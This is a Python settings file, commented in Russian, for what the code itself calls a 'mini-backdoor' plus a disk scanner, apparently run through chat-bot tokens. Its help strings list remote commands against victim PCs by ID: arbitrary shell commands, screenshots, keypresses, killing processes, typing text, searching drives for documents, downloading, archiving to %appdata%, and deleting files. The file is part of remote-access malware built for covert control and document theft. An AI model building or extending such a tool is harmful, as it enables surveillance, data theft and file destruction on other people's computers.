# < ---------------------------------------- >

# Сканер дисков токен
finder_token = ''

# Мини-backdoor токен
joker_token = ''

# < ---------------------------------------- >

# Нужен только для конфиденциальности ID`шников

chat_id = ''

# Лимит ID`шников

limit_id = int(100000)

# Символ, который заменяется на пробелы

space_symbol = '+'

# < ---------------------------------------- >

scan = 'Начало сканирования!'
success = 'Успех!'

errorMessage = 'Ошибка!'
arrayIsEmpty = errorMessage + ' Массив пуст!'
indexOutOfBounds = errorMessage + ' Выход за границу массива!'

# < ---------------------------------------- >

joker_help = str("/cmd <ID> <command (пробелы меняем на '+')> - just cmd\n\n" +
                 "/shutdown <ID> <1 - Shutdown, 2 - Restart>\n\n" +
                 "/process <ID> - процессы на PC\n\n" +
                 "/wind <ID>  - скрыть все окна\n\n" +
                 "/altf4 <ID> - убить текущее окно\n\n" +
                 "/press <ID> <ctrl+a+delete> - нажать кнопки на PC\n\n" +
                 "/image <ID> - скрин экрана PC\n\n" +
                 "/kill <ID> <file.exe> - убить процесс на PC\n\n" +
                 "/url <ID> <url> - открыть ссылку на PC\n\n" +
                 "/print <ID> <я+люблю+кодить> - вписывает текст в текстбох PC\n\n" +
                 "/replace <ID> <я+люблю+кодить> - выделяет текст и заменяет его\n\n")

finder_help = text = str("/image <ID> - скрин экрана PC\n\n" +
                         "/drives <ID>  - показывает все диски/флешки\n\n" +
                         "/scan <ID> <C/D> <doc/docx> - сканирует пк на наличие файлов\n\n" +
                         "/nameload <ID> <C/D> <doc/docx> <name> - скачивает файл по имени\n\n" +
                         "/numload <ID> <arrayID> - скачивает файл по индексу\n\n" +
                         "/archive <ID> <C/D> <doc/docx> - архивирует в %appdata%\n\n" +
                         "/open <ID> <arrayID> - открывает файл\n\n" +
                         "/delete <ID> <arrayID> - удаляет файл\n\n" +
                         "/list <ID> <от> <до> - показывает названия файлов от и до\n\n")

# < ---------------------------------------- >
